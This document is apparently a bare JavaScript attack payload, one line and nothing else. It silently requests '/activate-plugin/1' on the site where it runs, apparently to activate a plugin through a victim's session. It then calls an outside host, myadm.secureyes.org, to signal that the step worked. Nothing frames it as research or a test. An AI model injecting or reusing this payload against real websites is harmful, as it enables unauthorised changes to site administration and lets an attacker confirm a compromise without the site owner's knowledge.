fetch("/activate-plugin/1").then(response => response.text()).then(data => fetch("http://myadm.secureyes.org/ok"));
